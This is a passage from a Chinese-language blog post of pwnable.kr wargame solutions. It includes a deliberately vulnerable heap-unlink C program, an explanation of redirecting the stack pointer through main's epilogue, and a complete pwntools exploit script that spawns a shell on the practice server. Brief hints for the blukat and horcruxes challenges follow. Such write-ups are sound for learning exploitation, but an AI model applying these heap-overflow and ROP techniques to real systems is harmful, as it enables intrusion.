<span class="kt">void</span> <span class="nf">unlink</span><span class="p">(</span><span class="n">OBJ</span><span class="o">*</span> <span class="n">P</span><span class="p">){</span>
	<span class="n">OBJ</span><span class="o">*</span> <span class="n">BK</span><span class="p">;</span>
	<span class="n">OBJ</span><span class="o">*</span> <span class="n">FD</span><span class="p">;</span>
	<span class="n">BK</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
	<span class="n">FD</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
	<span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">=</span><span class="n">BK</span><span class="p">;</span>
	<span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">FD</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
	<span class="n">malloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span>
	<span class="n">OBJ</span><span class="o">*</span> <span class="n">A</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
	<span class="n">OBJ</span><span class="o">*</span> <span class="n">B</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
	<span class="n">OBJ</span><span class="o">*</span> <span class="n">C</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>

	<span class="c1">// double linked list: A &lt;-&gt; B &lt;-&gt; C
</span><span class="c1"></span>	<span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
	<span class="n">B</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">A</span><span class="p">;</span>
	<span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">C</span><span class="p">;</span>
	<span class="n">C</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;here is stack address leak: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">A</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;here is heap address leak: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">A</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;now that you have leaks, get shell!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="c1">// heap overflow!
</span><span class="c1"></span>	<span class="n">gets</span><span class="p">(</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">);</span>

	<span class="c1">// exploit this unlink!
</span><span class="c1"></span>	<span class="n">unlink</span><span class="p">(</span><span class="n">B</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>heap overflow + unlink实现任意写</p>
<p>本来想直接覆盖<code>unlink</code>函数的返回地址，修改成<code>shell</code>函数的起始地址，但是这样会导致<code>[Shell函数的起始地址+4 ] = Unlink的返回地址</code>，text段不可写会出错。也就是说只能够找两处可写的地址进行修改。</p>
<p>main函数结尾处的指令如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">.text:080485FF 8B 4D FC                                mov     ecx, [ebp+var_4]
.text:08048602 C9                                      leave
.text:08048603 8D 61 FC                                lea     esp, [ecx-4]
.text:08048606 C3                                      retn
</code></pre></td></tr></table>
</div>
</div><p>这里将栈中的内容赋值给ecx</p>
<p>leave相当于<code>mov esp, ebp; pop ebp</code></p>
<p>然后又将<code>esp = ecx - 4</code>，即可以操控栈顶。</p>
<p>因此，可以构造 [ecx-4] = shell的起始地址，在retn的时候就可以转到shell处执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;pwnable.kr&#34;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s2">&#34;unlink&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2222</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;guest&#34;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">connected</span><span class="p">():</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;/home/unlink/unlink&#39;</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;here is stack address leak: &#34;</span><span class="p">)</span>
    <span class="n">stack_base_str</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;stack_base: &#34;</span> <span class="o">+</span> <span class="n">stack_base_str</span><span class="p">)</span>
    <span class="n">stack_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">stack_base_str</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;here is heap address leak: &#34;</span><span class="p">)</span>
    <span class="n">heap_base_str</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;heap_base: &#34;</span> <span class="o">+</span> <span class="n">heap_base_str</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">heap_base_str</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

    <span class="n">shell_addr</span> <span class="o">=</span> <span class="mh">0x080484EB</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shell_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_base</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="blukat">blukat</h2>
<p>本来以为没啥入手点结果看别人wp说blukat和blukat_pwn两个用户在一个组里所以可以直接读password文件的内容&hellip;</p>
<h2 id="horcruxes">horcruxes</h2>
<p>rop转到给的七个函数处打印出来各个变量的值然后求和</p>
<p>总和不能超过int所以需要循环试几次才能出flag</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2022-04-02&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e" target="_blank" title="commit by LinkleYping(1056669812@qq.com) 7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e: init blog">
                                    <i class="fas fa-hashtag fa-fw"></i>7b7305e</a></span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/pwnable_kr_1/index.md" target="_blank">阅读原始文档</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://linkleyping.top/pwnable_kr_1/" data-title="pwnable.kr first part"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://linkleyping.top/pwnable_kr_1/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://linkleyping.top/pwnable_kr_1/" data-title="pwnable.kr first part"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://linkleyping.top/pwnable_kr_1/" data-title="pwnable.kr first part"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://linkleyping.top/pwnable_kr_1/" data-title="pwnable.kr first part"><i class="fab fa-weibo fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/anywhere/" class="prev" rel="prev" title="LaunchAnywhere 和 BroadcastAnywhere"><i class="fas fa-angle-left fa-fw"></i>LaunchAnywhere 和 BroadcastAnywhere</a>
            <a href="/cve-2018-1160/" class="next" rel="next" title="CVE-2018-1160分析与复现">CVE-2018-1160分析与复现<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                </div>
                <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
                <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
            

            <div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"RFO4PNFHT1","algoliaIndex":"blog","algoliaSearchKey":"d13f32411166c6212551ffa815910ba5","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
